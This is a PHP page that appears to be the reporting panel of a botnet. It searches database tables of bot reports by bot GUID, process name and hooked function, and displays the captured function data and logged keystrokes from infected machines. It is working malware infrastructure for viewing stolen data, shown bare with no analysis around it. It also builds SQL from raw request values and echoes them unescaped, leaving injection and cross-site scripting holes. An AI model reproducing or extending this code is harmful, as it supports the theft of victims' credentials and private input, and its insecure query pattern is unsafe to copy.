<script type="text/javascript">
    var GB_ROOT_DIR = "js/greybox/";
</script>

<script type="text/javascript" src="js/greybox/AJS.js"></script>
<script type="text/javascript" src="js/greybox/AJS_fx.js"></script>
<script type="text/javascript" src="js/greybox/gb_scripts.js"></script>
<link href="js/greybox/gb_styles.css" rel="stylesheet" type="text/css" />

<?

$bot_guid = $_POST['bot_guid'];
$process_name = $_POST['process_name'];
$hooked_func = $_POST['hooked_func'];
$repdatestart = $_POST['repdatestart'];
$repdateend = $_POST['repdateend'];
$data = $_POST['data'];
$limit = $_POST['limit'];
$dt = $_GET['dt'];

if (strlen($bot_guid))
	$sqlp1 = " AND rep2_$dt.bot_guid = '$bot_guid'";
if (strlen($process_name))
	$sqlp2 = " AND rep2_$dt.process_name = '$process_name'";
if (strlen($hooked_func))
	$sqlp3 = " AND rep2_$dt.hooked_func = '$hooked_func'";
/* if (strlen($repdatestart) && strlen($repdateend)) {
	list($day, $month, $year) = split('[ :\/.-]', $repdatestart);
	$tstamp = gmmktime (0, 0, 0, $month, $day, $year);
	$repdatestart = gmdate('Y.m.d H:i:s', $tstamp);
	list($day, $month, $year) = split('[ :\/.-]', $repdateend);
	$tstamp = gmmktime (0, 0, 0, $month, $day, $year);
	$repdateend = gmdate('Y.m.d H:i:s', $tstamp);

	$sqlp4 = " AND ( rep2_$dt.date_rep >= '$repdatestart' AND rep2_$dt.date_rep <= '$repdateend')";
} */
if (strlen($data)) {
	if ( strpos($data, '*') !== false ) {
		$data = str_replace( '*', '%', $data );
	}
	if ($data{0} != '%')
		$data = '%' . $data;
	if ($data{ strlen($data) - 1 } != '%')
		$data .= '%';
	
	$sqlp5 = " AND rep2_$dt.func_data LIKE '$data'";
}
if (strlen($limit)) {
	$sqlp6 = " LIMIT $limit";
}

$sql = 'SELECT *'
	 . "  FROM rep2_$dt"
	 . ' WHERE TRUE'
	 . $sqlp1
	 . $sqlp2
	 . $sqlp3
	// . $sqlp4
	 . $sqlp5
	 . $sqlp6;
	 
?>

<?
require_once 'mod_file.php';
require_once 'mod_time.php';
require_once 'mod_dbase.php';
require_once 'mod_strenc.php';

$dbase = db_open();

$res = mysqli_query($dbase, $sql);
if (!(@($res))) {
	writelog("error.log", "Wrong query : \" $sql \"");
	db_close($dbase);
	exit;
}

if ( mysqli_num_rows($res) == 0) {
	echo "<b>Not found</b>";
	db_close($dbase);
	exit;
}

echo "<table width='730' border='1' cellspacing='0' cellpadding='3' style='border: 1px solid #BBBBBB; font-size: 9px; border-collapse: collapse; background-color: #4992a7;'>";

echo "<th style=' color: #EEEEEE;'>id</th>";
echo "<th style=' color: #EEEEEE;'>bot_guid</th>";
echo "<th style=' color: #EEEEEE;'>process_name</th>";
echo "<th style=' color: #EEEEEE;'>hooked_func</th>";
echo "<th style=' color: #EEEEEE;'>date_rep</th>";

while ( list($id, $bot_guid, $process_name, $hooked_func, $func_data, $keys, $date_rep) = mysqli_fetch_row($res) ) {
	echo "<tr><td colspan='4'></td></tr>";
	
	echo "<tr align='center' valign='middle' style=' background-color: #cce7ef; '>";
	
	echo "<td><a src='#null' onclick=\"GB_show('Detail info for selected bot', '../../frm_bot.php?guid=$bot_guid', 300, 600); return false;\"><img src='img/info.png' title='$id'></a></td>";
	echo "<td>$bot_guid</td>";
	echo "<td>$process_name</td>";
	echo "<td>$hooked_func</td>";
	echo "<td>$date_rep</td>";
	
	echo '</tr>';
	
	// displaying keys too
	$data = $func_data;
	if (strlen($keys) != 0) {
		$keys = ucs2html($keys);
		$data = "$data\n\nkeys: $keys";
	}
	
	echo "<tr style=' background-color: #cce7ef; '>";
	
	echo "<td colspan='5'><textarea onmouseover='this.style.backgroundColor = \"white\"; this.style.height = this.scrollHeight + \"px\";' onmouseout='this.style.backgroundColor=\"#e7f2f6\"; this.style.height = \"100px\";' style=' border-width: 1px; width: 730px; height: 100px; background-color: #e7f2f6; color: #666666; ' readonly >$data</textarea></td>";
	
	echo '</tr>';
}
db_close($dbase);

echo "</table>";

?>